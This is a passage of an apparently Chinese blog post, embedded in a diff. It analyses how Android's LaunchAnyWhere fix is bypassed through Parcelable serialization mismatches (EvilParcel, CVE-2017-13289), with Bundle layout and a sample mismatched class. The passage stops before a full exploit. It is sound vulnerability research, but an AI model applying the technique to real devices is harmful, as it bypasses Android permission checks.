class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>{</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>{</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span> </span>{</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="comment">// 1.&#x5FC5;&#x987B;&#x6309;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x58F0;&#x660E;&#x7684;&#x987A;&#x5E8F;&#x5C01;&#x88C5;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x51FA;&#x73B0;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x51FA;&#x9519;</span></span><br><span class="line">        <span class="comment">// 2.&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;</span></span><br><span class="line">        dest.writeInt(id);</span><br><span class="line">        dest.writeString(name);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-Bundle"><a href="#1-3-Bundle" class="headerlink" title="1.3 Bundle"></a>1.3 Bundle</h3><blockquote>
+<p> &#x53EF;&#x5E8F;&#x5217;&#x5316;&#x7684;Parcelable&#x5BF9;&#x8C61;&#x4E00;&#x822C;&#x4E0D;&#x5355;&#x72EC;&#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x4F20;&#x8F93;&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7;Bundle&#x5BF9;&#x8C61;&#x643A;&#x5E26;&#x3002; Bundle&#x7684;&#x5185;&#x90E8;&#x5B9E;&#x73B0;&#x5B9E;&#x9645;&#x662F;Hashmap&#xFF0C;&#x4EE5;Key-Value&#x952E;&#x503C;&#x5BF9;&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x3002;&#x4F8B;&#x5982;&#xFF0C; Android&#x4E2D;&#x8FDB;&#x7A0B;&#x95F4;&#x901A;&#x4FE1;&#x9891;&#x7E41;&#x4F7F;&#x7528;&#x7684;Intent&#x5BF9;&#x8C61;&#x4E2D;&#x53EF;&#x643A;&#x5E26;&#x4E00;&#x4E2A;Bundle&#x5BF9;&#x8C61;&#xFF0C;&#x5229;&#x7528;<code>putExtra(key, value)</code>&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x5F80;Intent&#x7684;Bundle&#x5BF9;&#x8C61;&#x4E2D;&#x6DFB;&#x52A0;&#x952E;&#x503C;&#x5BF9;(Key Value)&#x3002;Key&#x4E3A;String&#x7C7B;&#x578B;&#xFF0C;&#x800C;Value&#x5219;&#x53EF;&#x4EE5;&#x4E3A;&#x5404;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x5305;&#x62EC;int&#x3001;Boolean&#x3001;String&#x548C;Parcelable&#x5BF9;&#x8C61;&#x7B49;&#x7B49;&#xFF0C;Parcel&#x7C7B;&#x4E2D;&#x7EF4;&#x62A4;&#x7740;&#x8FD9;&#x4E9B;&#x7C7B;&#x578B;&#x4FE1;&#x606F;&#x3002; </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment">// Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.</span></span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_NULL = -<span class="number">1</span>;</span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_STRING = <span class="number">0</span>;</span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_INTEGER = <span class="number">1</span>;</span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_MAP = <span class="number">2</span>;</span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_BUNDLE = <span class="number">3</span>;</span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_PARCELABLE = <span class="number">4</span>;</span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_SHORT = <span class="number">5</span>;</span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_LONG = <span class="number">6</span>;</span><br><span class="line">&gt;     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> VAL_FLOAT = <span class="number">7</span>;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>&#x5BF9;Bundle&#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F9D;&#x6B21;&#x5199;&#x5165;&#x643A;&#x5E26;&#x6240;&#x6709;&#x6570;&#x636E;&#x7684;&#x957F;&#x5EA6;&#xFF0C;Bundle&#x9B54;&#x6570;<code>0x4C444E42</code>&#x548C;&#x952E;&#x503C;&#x5BF9;<code>BaseBundle.writeToParcelInner</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">int</span> lengthPos = parcel.dataPosition();</span><br><span class="line">&gt; parcel.writeInt(-<span class="number">1</span>); <span class="comment">// dummy, will hold length</span></span><br><span class="line">&gt; parcel.writeInt(BUNDLE_MAGIC); </span><br><span class="line">&gt; <span class="keyword">int</span> startPos = parcel.dataPosition(); </span><br><span class="line">&gt; parcel.writeArrayMapInternal(map);	</span><br><span class="line">&gt; <span class="keyword">int</span> endPos = parcel.dataPosition(); </span><br><span class="line">&gt; <span class="comment">// Backpatch length</span></span><br><span class="line">&gt; parcel.setDataPosition(lengthPos);</span><br><span class="line">&gt; <span class="keyword">int</span> length = endPos - startPos;</span><br><span class="line">&gt; parcel.writeInt(length);</span><br><span class="line">&gt; parcel.setDataPosition(endPos);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+</blockquote>
+<h3 id="1-4-&#x7B80;&#x5355;&#x603B;&#x7ED3;"><a href="#1-4-&#x7B80;&#x5355;&#x603B;&#x7ED3;" class="headerlink" title="1.4 &#x7B80;&#x5355;&#x603B;&#x7ED3;"></a>1.4 &#x7B80;&#x5355;&#x603B;&#x7ED3;</h3><p>&#x57FA;&#x4E8E;&#x4E0A;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x524D;&#x9762;&#x6211;&#x4EEC;&#x6240;&#x77E5;&#x9053;&#x7684;&#x57FA;&#x7840;&#x77E5;&#x8BC6;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x4E00;&#x4E0B;&#x5185;&#x5BB9;:</p>
+<ol>
+<li><p>&#x5B58;&#x5728;Android &#x7CFB;&#x7EDF;&#x6F0F;&#x6D1E; <code>Android-bug-7699048</code>&#xFF0C;&#x5B83;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x5728;App&#x4F7F;&#x7528; <code>AccountManagerService</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5728;<code>AddAccount</code>&#x65B9;&#x6CD5;&#x4E2D;&#x8FD4;&#x56DE;&#x4EFB;&#x610F;Bundle&#xFF0C;&#x800C;&#x5982;&#x679C;&#x5728;Bundle&#x4E2D;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x7684;intent&#xFF0C;&#x4EE5;&#x6B64;&#x8FBE;&#x5230;ActivityLunchAnywhere&#x7684;&#x76EE;&#x7684;</p>
+</li>
+<li><p>Bundle&#x5728;App&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x662F;&#x4F7F;&#x7528;<code>Parcelable</code>&#x5B8C;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5E76;&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x7684;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;</p>
+</li>
+<li><p>google&#x4FEE;&#x590D;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#x662F; &#x68C0;&#x67E5;&#x4E86;<code>AddAccount</code>&#x4E2D;&#x8FD4;&#x56DE;&#x7684;intent&#x6240;&#x6307;&#x5411;&#x7684;Activity&#x548C;AppB&#x662F;&#x5426;&#x662F;&#x6709;&#x76F8;&#x540C;&#x7B7E;&#x540D;&#x7684;&#x3002; &#x5982;&#x679C;&#x4E0D;&#x540C;&#x5C06;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;<code>SecurityException</code></p>
+<p>&#x5728;android-7.1.2_r39&#x7248;&#x672C;&#x4E2D;&#xFF0C;AccountManagerService&#x5BF9;&#x4E8E;<code>AddAccount</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#x7684;&#x6E90;&#x7801;&#x5982;&#x4E0B;  <code>services/core/java/com/android/server/accounts/AccountManagerService.java</code>:</p>
+<p><img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/1586692247028.png" alt="1586693832470"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Checks Intents, supplied via KEY_INTENT, to make sure that they don&apos;t violate our</span></span><br><span class="line"><span class="comment"> * security policy.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In particular we want to make sure that the Authenticator doesn&apos;t try to trick </span></span><br><span class="line"><span class="comment"> * users</span></span><br><span class="line"><span class="comment"> * into launching aribtrary intents on the device via by tricking to </span></span><br><span class="line"><span class="comment"> * click authenticator</span></span><br><span class="line"><span class="comment"> * supplied entries in the system Settings app.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">checkKeyIntent</span><span class="params">(<span class="keyword">int</span> authUid, Intent intent)</span> <span class="keyword">throws</span> SecurityException </span>{</span><br><span class="line">    intent.setFlags(intent.getFlags() &amp; ~(Intent.FLAG_GRANT_READ_URI_PERMISSION</span><br><span class="line">                                      | Intent.FLAG_GRANT_WRITE_URI_PERMISSION</span><br><span class="line">                                      | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION</span><br><span class="line">                                      | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION));</span><br><span class="line">    <span class="keyword">long</span> bid = Binder.clearCallingIdentity();</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        PackageManager pm = mContext.getPackageManager();</span><br><span class="line">        ResolveInfo resolveInfo = pm.resolveActivityAsUser(intent, <span class="number">0</span>, mAccounts.userId);</span><br><span class="line">        ActivityInfo targetActivityInfo = resolveInfo.activityInfo;</span><br><span class="line">        <span class="keyword">int</span> targetUid = targetActivityInfo.applicationInfo.uid;</span><br><span class="line">        <span class="keyword">if</span> (PackageManager.SIGNATURE_MATCH != pm.checkSignatures(authUid, targetUid)) {</span><br><span class="line">            String pkgName = targetActivityInfo.packageName;</span><br><span class="line">            String activityName = targetActivityInfo.name;</span><br><span class="line">            String tmpl = <span class="string">&quot;KEY_INTENT resolved to an Activity (%s) in a package (%s) that &quot;</span> + <span class="string">&quot;does not share a signature with the supplying authenticator (%s).&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(</span><br><span class="line">                String.format(tmpl, activityName, pkgName, mAccountType));</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">finally</span> {</span><br><span class="line">        Binder.restoreCallingIdentity(bid);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&#x5728;Bundle&#x5728;App&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x901A;&#x8FC7;Bundle&#x4F20;&#x9012;&#x6570;&#x636E;&#xFF0C;&#x5728;&#x4F20;&#x9012;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8FDB;&#x884C;&#x4E24;&#x6B21;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x5BF9;&#x4F20;&#x8F93;&#x7684;Intent&#x8FDB;&#x884C;&#x6743;&#x9650;&#x68C0;&#x67E5;,&#x68C0;&#x67E5;&#x7684;&#x65F6;&#x95F4;&#x70B9;&#x5C31;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x5E8F;&#x5217;&#x5316;&#x5E76;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x3002;</p>
+</li>
+</ol>
+<p><img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/1586615251045.png" alt="1586615251045"></p>
+<h2 id="2-&#x7ED5;&#x8FC7;"><a href="#2-&#x7ED5;&#x8FC7;" class="headerlink" title="2 &#x7ED5;&#x8FC7;"></a>2 &#x7ED5;&#x8FC7;</h2><p>&#x5728;&#x548C;<code>CVE-2017-13289</code>&#x540C;&#x4E00;&#x6279;&#x7684;&#x6F0F;&#x6D1E;&#x4E2D;&#xFF0C;&#x6709;&#x7740;&#x4E00;&#x7CFB;&#x5217;&#x76F8;&#x540C;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#xFF0C;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E0D;&#x5339;&#x914D;&#xFF0C;&#x5229;&#x7528;&#x6784;&#x9020;&#x7684;Bundle&#x80FD;&#x5DE7;&#x5999;&#x7684;&#x7ED5;&#x8FC7;system_service&#x4E2D;&#x5BF9;&#x4E8E;<code>intent</code>&#x7684;&#x6743;&#x9650;&#x68C0;&#x67E5;&#x3002;</p>
+<blockquote>
+<ul>
+<li>&#x901A;&#x8FC7;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;Intent&#x5BF9;&#x8C61;&#xFF0C;&#x6240;&#x6709;Android&#x7A0B;&#x5E8F;&#x4E4B;&#x95F4;&#x4EE5;&#x53CA;&#x4E0E;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x90FD;&#x8FDB;&#x884C;&#x4EA4;&#x4E92; </li>
+<li>&#x8FD9;&#x4E9B;&#x5BF9;&#x8C61;&#x53EF;&#x4EE5;&#x5728;Bundle&#x5BF9;&#x8C61;&#x4E2D;&#x5305;&#x542B;&#x4EFB;&#x610F;&#x6570;&#x91CF;&#x7684;&#x952E;/&#x503C;&#x5BF9;&#x3002; </li>
+<li>&#x4F20;&#x8F93;Intent&#x65F6;&#xFF0C;&#x5C06;Bundle&#x5BF9;&#x8C61;&#x8F6C;&#x6362;&#xFF08;&#x5E8F;&#x5217;&#x5316;&#xFF09;&#x4E3A;&#x5305;&#x88F9;&#x5728;Parcel&#x4E2D;&#x7684;&#x5B57;&#x8282;&#x6570;&#x7EC4;</li>
+<li>&#x5728;&#x4ECE;&#x5E8F;&#x5217;&#x5316;Bundle&#x4E2D;&#x8BFB;&#x53D6;&#x952E;&#x548C;&#x503C;&#x540E;&#x81EA;&#x52A8;&#x5C06;&#x5176;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002; </li>
+<li>&#x5728;Bundle&#x4E2D;&#xFF0C;&#x952E;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x503C;&#x51E0;&#x4E4E;&#x53EF;&#x4EE5;&#x662F;&#x4EFB;&#x4F55;&#x503C;&#x3002;&#x53EF;&#x4EE5;&#x662F;&#x539F;&#x59CB;&#x7C7B;&#x578B;&#xFF0C;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x5177;&#x6709;&#x539F;&#x59CB;&#x7C7B;&#x578B;&#x6216;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5BB9;&#x5668;,&#x5B83;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x4E2A;Parcelable&#x5BF9;&#x8C61;&#x3002; </li>
+<li>&#x56E0;&#x6B64;&#xFF0C;Bundle&#x4E2D;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x5B9E;&#x73B0;Parcelable&#x63A5;&#x53E3;&#x7684;&#x4EFB;&#x4F55;&#x7C7B;&#x578B;&#x7684;&#x5BF9;&#x8C61;&#x3002; </li>
+<li>&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5B9E;&#x73B0;writeToParcel&#xFF08;&#xFF09;&#x548C;createFromParcel&#xFF08;&#xFF09;&#x65B9;&#x6CD5;&#x6765;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x3002; </li>
+</ul>
+</blockquote>
+<p><img src="/2020/04/12/LaunchAnyWhere&#x7ED5;&#x8FC7;&#x539F;&#x7406;/pf-92jsexpyrb7p2dvi8oj3-vbs.png" alt="img"> </p>
+<p>Bundle&#x5728;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x6784;:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bundle ---&gt; {</span><br><span class="line">    bundle_size;         <span class="comment">// &#x643A;&#x5E26;&#x6570;&#x636E;&#x7684;&#x957F;&#x5EA6;</span></span><br><span class="line">    bindle_magic;	     <span class="comment">// 0x4c444e42</span></span><br><span class="line">    number_of_entries;   <span class="comment">// &#x952E;&#x503C;&#x5BF9;&#x7684;&#x6570;&#x91CF;</span></span><br><span class="line">    key;				 <span class="comment">// &#x952E;</span></span><br><span class="line">    value;				 <span class="comment">// &#x503C;</span></span><br><span class="line">}</span><br><span class="line">key ---&gt; {</span><br><span class="line">    key_length;			 <span class="comment">// &#x952E;&#x957F;&#x5EA6;&#xFF0C;2&#x4E2A;&#x5B57;&#x8282;&#x4E3A;&#x57FA;&#x672C;&#x5355;&#x4F4D;</span></span><br><span class="line">    key_v;				 <span class="comment">// &#x952E;&#x503C;</span></span><br><span class="line">}</span><br><span class="line">value ---&gt; {</span><br><span class="line">    value_type;			 <span class="comment">// &#x503C;&#x7C7B;&#x578B;</span></span><br><span class="line">    value_length;		 <span class="comment">// &#x5982;&#x679C;&#x662F;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x7684;&#x8BDD;&#xFF0C;&#x6709;&#x8FD9;&#x4E2A;</span></span><br><span class="line">    value_v;			 <span class="comment">// &#x503C;&#x7684;&#x5177;&#x4F53;&#x503C;</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x540E;&#x7684;Bundle&#x5177;&#x6709;&#x4EE5;&#x4E0B;&#x7279;&#x70B9;:</p>
+<ol>
+<li>&#x6240;&#x6709;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x90FD;&#x662F;&#x6309;&#x987A;&#x5E8F;&#x5199;&#x5165;</li>
+<li>&#x5728;&#x6BCF;&#x4E2A;&#x503C;&#x4E4B;&#x524D;&#x90FD;&#x6709;&#x6307;&#x793A;&#x503C;&#x7684;&#x7C7B;&#x578B;</li>
+<li>&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x5927;&#x5C0F;&#x5728;&#x6570;&#x636E;&#x4E4B;&#x524D;&#x663E;&#x793A;(&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x6570;&#x7EC4;&#x7684;&#x5B57;&#x8282;&#x6570;) </li>
+<li>&#x6240;&#x6709;&#x503C;&#x90FD;&#x662F;4&#x5B57;&#x8282;&#x5BF9;&#x9F50;&#x7684;</li>
+</ol>
+<h3 id="2-1-trouble"><a href="#2-1-trouble" class="headerlink" title="2.1 trouble"></a>2.1 trouble</h3><blockquote>
+<p> &#x6240;&#x6709;&#x952E;&#x548C;&#x503C;&#x90FD;&#x6309;&#x987A;&#x5E8F;&#x5199;&#x5165;Bundle&#xFF0C;&#x4EE5;&#x4FBF;&#x5728;&#x8BBF;&#x95EE;&#x5E8F;&#x5217;&#x5316;Bundle&#x5BF9;&#x8C61;&#x7684;&#x4EFB;&#x4F55;&#x952E;&#x6216;&#x503C;&#x65F6;&#xFF0C;&#x540E;&#x8005;&#x5C06;&#x5B8C;&#x5168;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x8FD8;&#x521D;&#x59CB;&#x5316;&#x6240;&#x6709;&#x5305;&#x542B;&#x7684;Parcelable&#x5BF9;&#x8C61;&#x3002; </p>
+<p> &#x95EE;&#x9898;&#x5728;&#x4E8E;&#xFF0C;&#x5B9E;&#x73B0;Parcelable&#x7684;&#x67D0;&#x4E9B;&#x7CFB;&#x7EDF;&#x7C7B;&#x53EF;&#x80FD;&#x5728; <code>createFromParcel()</code>&#x548C;<code>writeToParcel()</code>&#x65B9;&#x6CD5;&#x4E2D;&#x5305;&#x542B;&#x9519;&#x8BEF;&#x3002; </p>
+<p> &#x5728;&#x8FD9;&#x4E9B;&#x7C7B;&#x4E2D;&#xFF0C;&#x5728;<code>createFromParcel()</code>&#x4E2D;&#x8BFB;&#x53D6;&#x7684;&#x5B57;&#x8282;&#x6570;&#x5C06;&#x4E0E;&#x5728;<code>writeToParcel()</code>&#x4E2D;&#x5199;&#x5165;&#x7684;&#x5B57;&#x8282;&#x6570;&#x4E0D;&#x540C;&#x3002; </p>
+<p> &#x5982;&#x679C;&#x5C06;&#x6B64;&#x7C7B;&#x7684;&#x5BF9;&#x8C61;&#x653E;&#x7F6E;&#x5728;Bundle&#x4E2D;&#xFF0C;&#x5219;&#x91CD;&#x65B0;&#x5E8F;&#x5217;&#x5316;&#x540E;&#xFF0C;Bundle&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x8FB9;&#x754C;&#x5C06;&#x66F4;&#x6539;&#x3002;&#x8FD9;&#x4E3A;&#x5229;&#x7528;EvilParcel&#x6F0F;&#x6D1E;&#x521B;&#x9020;&#x4E86;&#x6761;&#x4EF6;&#x3002; </p>
+</blockquote>
+<p>eg&#xFF1A;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">implements</span> <span class="title">Parcelable</span> </span>{</span><br><span class="line">    <span class="keyword">byte</span>[] data;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span> </span>{</span><br><span class="line">      <span class="keyword">this</span>.data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">Demo</span><span class="params">(Parcel in)</span> </span>{</span><br><span class="line">      <span class="keyword">int</span> length = in.readInt();</span><br><span class="line">      data = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">      <span class="keyword">if</span> (length &gt; <span class="number">0</span>) {</span><br><span class="line">         in.readByteArray(data);</span><br><span class="line">      }</span><br><span class="line">     }</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Creator&lt;Demo&gt; CREATOR = <span class="keyword">new</span> Creator&lt;Demo&gt;() {</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> Demo <span class="title">createFromParcel</span><span class="params">(Parcel in)</span> </span>{</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> Demo(in);</span><br><span class="line">       }</span><br><span class="line">     };</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel parcel, <span class="keyword">int</span> i)</span> </span>{</span><br><span class="line">       parcel.writeInt(data.length);</span><br><span class="line">       parcel.writeByteArray(data);</span><br><span class="line">     }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x5982;&#x679C;&#x6570;&#x636E;&#x6570;&#x7EC4;&#x5927;&#x5C0F;&#x4E3A;0&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x521B;&#x9020;&#x5BF9;&#x8C61;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5728;<code>createFromParcel</code>&#x4E2D;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;<code>int(4&#x4E2A;&#x5B57;&#x8282;)</code>&#xFF0C;&#x540C;&#x65F6;&#x5728;<code>writeToParcel()</code>&#x5199;&#x5165;&#x4E24;&#x4E2A;<code>int(8&#x5B57;&#x8282;)</code>&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;<code>int</code>&#x901A;&#x8FC7;&#x663E;&#x5F0F;&#x8C03;&#x7528;<code>writeInt()</code>&#x5199;&#x5165;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;<code>int</code>&#x5728;&#x8C03;&#x7528;<code>writeByteArray()</code>&#x65F6;&#x5199;&#x5165;(&#x56E0;&#x4E3A;&#x5728;&#x5199;&#x5165;&#x6570;&#x7EC4;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6570;&#x7EC4;&#x957F;&#x5EA6;&#x59CB;&#x7EC8;&#x5728;Parcel&#x7684;&#x6570;&#x7EC4;&#x4E4B;&#x524D;)&#x3002;</p>
+<p>&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C1D;&#x8BD5;&#x5728;Bundle&#x4E2D;&#x653E;&#x5165;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x957F;&#x5EA6;&#x4E3A;0&#x7684;Demo&#x5BF9;&#x8C61;:</p>
